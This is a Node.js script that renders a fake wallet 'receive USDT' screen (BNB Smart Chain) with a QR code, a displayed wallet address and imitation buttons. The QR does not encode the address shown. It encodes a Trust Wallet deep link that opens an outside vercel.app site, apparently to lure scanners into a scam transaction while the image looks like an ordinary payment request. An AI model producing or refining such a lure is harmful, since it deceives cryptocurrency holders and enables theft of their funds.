const QRCode = require("qrcode");
const { createCanvas, loadImage } = require("canvas");
const fs = require("fs");

const URL = 
"https://link.trustwallet.com/open_url?url=https://send-usdvercel.vercel.app";
const ADDRESS = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";

async function generate() {
  const canvas = createCanvas(800, 1100);
  const ctx = canvas.getContext("2d");

  ctx.fillStyle = "#0b0b0b";
  ctx.fillRect(0, 0, 800, 1100);

  ctx.fillStyle = "#fff";
  ctx.font = "bold 42px Arial";
  ctx.fillText("USDT", 330, 110);

  ctx.fillStyle = "#888";
  ctx.font = "22px Arial";
  ctx.fillText("BNB Smart Chain", 260, 150);

  ctx.fillStyle = "#fff";
  ctx.fillRect(100, 200, 600, 650);

  const qr = await QRCode.toDataURL(URL);
  const img = await loadImage(qr);
  ctx.drawImage(img, 150, 250, 500, 500);

  ctx.fillStyle = "#fff";
  ctx.beginPath();
  ctx.arc(400, 500, 60, 0, Math.PI * 2);
  ctx.fill();

  ctx.fillStyle = "#000";
  ctx.font = "bold 28px Arial";
  ctx.fillText("🔰", 382, 510);

  ctx.fillStyle = "#000";
  ctx.font = "18px Arial";
  ctx.fillText(ADDRESS.slice(0, 22), 180, 780);
  ctx.fillText(ADDRESS.slice(22), 180, 810);

  const buttons = ["Copy", "Set Amount", "Share"];

  buttons.forEach((text, i) => {
    const x = 130 + i * 180;

    ctx.fillStyle = "#1a1a1a";
    ctx.fillRect(x, 860, 140, 70);

    ctx.fillStyle = "#fff";
    ctx.font = "16px Arial";
    ctx.fillText(text, x + 30, 900);
  });

  fs.writeFileSync("qr-final.png", canvas.toBuffer());
  console.log("QR IDENTICO creato!");
}

generate();;
